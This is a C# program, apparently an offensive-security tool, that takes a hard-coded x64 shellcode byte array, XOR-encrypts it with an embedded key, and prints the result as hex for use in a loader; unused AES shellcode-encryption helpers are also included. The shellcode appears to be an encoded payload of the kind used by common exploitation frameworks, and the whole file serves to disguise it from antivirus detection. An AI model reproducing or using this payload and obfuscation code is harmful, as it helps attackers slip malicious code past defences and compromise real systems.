using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
namespace Encrypt
{
    class Program
    {
        static void Main(string[] args)
        {
          
            byte[] Key = Convert.FromBase64String("fRZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");

            
             byte[] IV = Convert.FromBase64String("pyve1rU+58PN/2MWEftieA==");

           // byte[] Key = ASCIIEncoding.ASCII.GetBytes("thisisa32bytekey0123456789!@#$%^");
            //byte[] IV = ASCIIEncoding.ASCII.GetBytes("thisis16bytes456");

            byte[] shell = new byte[] {0x48,0x31,0xc9,0x48,0x81,0xe9,0xb7,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xbc,0x2e,0xbf,0xd2,0xbb,0xe6,0xaa,0x70,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x40,0x66,0x3c,0x36,0x4b,0x0e,
0x66,0x70,0xbc,0x2e,0xfe,0x83,0xfa,0xb6,0xf8,0x38,0x8d,0xfc,0xee,0xb7,0xf3,
0x6d,0xf8,0x10,0xf4,0xa5,0xed,0xca,0xf3,0x6d,0xf8,0x50,0xea,0x66,0x34,0xa0,
0xeb,0xae,0xa5,0xc7,0xf6,0x64,0xf2,0xe3,0x72,0xae,0x9b,0xb0,0x10,0x12,0xde,
0xae,0xb9,0xca,0x8a,0x31,0x7d,0xe7,0xb2,0x93,0xba,0x27,0x48,0x9d,0xee,0x6f,
0xee,0x9a,0x30,0xb4,0x8a,0xfb,0xfe,0x12,0xf7,0xd3,0x6b,0x80,0x2b,0x08,0xa4,
0x25,0xbd,0xdd,0x3e,0x94,0xaa,0x70,0xbc,0xa5,0x3f,0x5a,0xbb,0xe6,0xaa,0x38,
0x39,0xee,0xcb,0xb5,0xf3,0xe7,0x7a,0x34,0x37,0x6e,0x9f,0x9b,0xba,0x36,0x21,
0x38,0xa4,0x7e,0x5c,0x84,0xf6,0xd7,0x63,0x38,0x43,0xe7,0xfe,0x59,0x8f,0x6e,
0xe2,0x71,0x6a,0x66,0x8e,0x12,0xfa,0x27,0x63,0x7d,0x10,0x6f,0xbe,0x13,0x83,
0x06,0xdf,0x81,0xf0,0x2d,0xf3,0xf6,0xb3,0xa3,0x93,0xa1,0xc9,0xf6,0xe7,0x96,
0x30,0xa6,0x8e,0x39,0xbd,0xfe,0xd9,0x93,0x30,0xea,0xe2,0x34,0x37,0x6e,0xa3,
0x9b,0xba,0x36,0xeb,0xfb,0xb8,0xa6,0xf7,0xd3,0x6b,0xa7,0xf2,0x31,0xe4,0x70,
0xe6,0x88,0xfa,0xbe,0xeb,0x29,0xfd,0x74,0xf7,0x51,0x57,0xc6,0xeb,0x22,0x43,
0xce,0xe7,0x93,0xe2,0xbc,0xe2,0xfb,0xae,0xc7,0xf4,0x2d,0x44,0x19,0xf7,0x38,
0x8d,0xf5,0xec,0x9b,0x05,0x91,0xc3,0x1e,0xd5,0x40,0xda,0xa6,0xbb,0xa7,0xfc,
0x38,0x35,0xcf,0xf6,0x15,0x79,0xaa,0xdd,0x56,0xbb,0xd1,0x6a,0x81,0xe8,0xae,
0x23,0x91,0xef,0x74,0xf2,0xe3,0x7b,0xab,0x9b,0xb9,0xef,0x7d,0xf6,0x68,0x81,
0xb0,0xd3,0xd7,0xbc,0x2e,0xbf,0xd2,0x44,0x33,0x42,0x7d,0xbc,0x2e,0xbf,0xe3,
0x82,0xd4,0x84,0x41,0x8a,0x16,0x91,0xe3,0x95,0xd1,0x98,0x70,0xe6,0x66,0x36,
0x13,0xf2,0x21,0x6a,0xcb,0xbd,0x2e,0xbf,0x9f,0x8a,0x2f,0xf9,0x23,0xd6,0x2d,
0xec,0x9b,0x01,0xb1,0x23,0xef,0x7a,0x2e,0xbf,0xd2,0xbb,0x19,0x7f,0x98,0xfe,
0x2e,0xbf,0xd2,0x94,0xcb,0xe2,0x45,0xc8,0x6b,0xe6,0x9c,0x96,0xbc,0xd3,0x28,
0x8d,0x1d,0xc9,0x86,0xd8,0x8a,0xe5,0x2a,0xc9,0x4c,0xd8,0x82,0xf3,0x80,0xec,
0x3e,0xf5,0x77,0xfa,0xb0,0xf7,0x89,0xcf,0x17,0xf5,0x5d,0xdb,0x88,0xd0,0xb0,
0xcf,0x18,0xf9,0x46,0xdb,0xa6,0xcc,0x88,0xcd,0x1f,0xf0,0x43,0xef,0x8a,0xf0,
0xbe,0xe7,0x3d,0xf6,0x5a,0xd7,0x91,0xde,0xe6,0xe2,0xf9,0x7d,0x7d,0xe5,0x93,
0xe3,0xab,0x9b,0xb9,0xef,0x66,0x07,0xd2,0xb9,0xce,0x2e,0x70,0xbc,0x2e,0xbf,
0x82,0xe8,0xb5,0xe3,0xb7,0x7e,0xc5,0xea,0xfc,0x80,0x19,0x7f,0x38,0x35,0xe8,
0xd5,0xd8,0xe4,0xb5,0xf0,0x38,0x35,0xdf,0xf2,0xe3,0x72,0xab,0x9b,0xb9,0xef,
0x7d,0xf6,0x15,0x79,0xcb,0xac,0x68,0xc7,0xd1,0x6a,0x57,0x7b,0x93,0xb5,0x38,
0x7b,0xef,0x37,0xc1,0xbb,0xe6,0xe3,0xca,0xf8,0xde,0x8a,0x32,0xbb,0xe6,0xaa,
0x70,0x43,0xfb,0xf7,0x2d,0x74,0x92,0xa8,0x9b,0x70,0xc6,0xea,0xd2,0xbb,0xe6,
0xf9,0x29,0xd6,0x6e,0xe5,0x9b,0x32,0x37,0x6b,0x92,0xac,0x67,0x78,0x12,0xbb,
0xf6,0xaa,0x70,0xf5,0x94,0xe7,0x76,0xe8,0x03,0xaa,0x70,0xbc,0x2e,0x40,0x07,
0xf3,0x75,0xf9,0x23,0xf4,0xa7,0x58,0x9a,0x32,0x17,0xe2,0xf9,0x66,0x67,0x78,
0x12,0xbb,0xc6,0xaa,0x70,0xf5,0xa7,0x46,0x9b,0x01,0xf4,0x3c,0xf9,0x5e,0x2e,
0xbf,0xd2,0xbb,0x19,0x7f,0x38,0x3f,0xea,0x9f,0x57,0x7b,0x92,0x18,0x16,0x37,
0x29,0xf7,0xd3,0x78,0x63,0x6a,0x05,0x6e,0x76,0x7c,0x8a,0xd1,0xe6,0xf3,0x39,
0x7b,0xec,0x4f,0x67,0x19,0xb0,0x55,0xa5};


            byte[] encshell = XOREncryptDecrypt(shell, Key);

            StringBuilder hexCodes = new StringBuilder(encshell.Length * 2);
            foreach (byte b in encshell)
            {
                hexCodes.AppendFormat("0x{0:x2},", b);
            }

            string finalencoded = hexCodes.ToString();

            finalencoded = finalencoded.Substring(0, finalencoded.Length - 1);

            Console.WriteLine(finalencoded);
            Console.Read();
        }



        private static byte[] XOREncryptDecrypt(byte[] baShellCode, byte[] baXorKey)
        {
            byte[] baXoredRes = new byte[baShellCode.Length];

            for (int i = 0; i < baShellCode.Length; i++)
            {
                baXoredRes[i] = (byte)(baShellCode[i] ^ baXorKey[i % baXorKey.Length]);
            }
            return baXoredRes;
        }

        private static byte[] GetIV(int num)
        {
            var randomBytes = new byte[num]; // 32 Bytes will give us 256 bits.

            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                // Fill the array with cryptographically secure random bytes.
                rngCsp.GetBytes(randomBytes);
            }

            return randomBytes;
        }

        private static byte[] GetKey(int size)
        {
            char[] caRandomChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()".ToCharArray();
            byte[] baKey = new byte[size];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetBytes(baKey);
            }
            return baKey;
        }

        private static byte[] AESEncryptShellCode(byte[] baShellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return GetAESEncryptedShellCode(baShellcode, encryptor);
                }
            }
        }

        private static byte[] GetAESEncryptedShellCode(byte[] baShellcode, ICryptoTransform cryptoTransform)
        {
            using (var msEncShellCode = new MemoryStream())
            using (var cryptoStream = new CryptoStream(msEncShellCode, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(baShellcode, 0, baShellcode.Length);
                cryptoStream.FlushFinalBlock();

                return msEncShellCode.ToArray();
            }
        }
    }
}
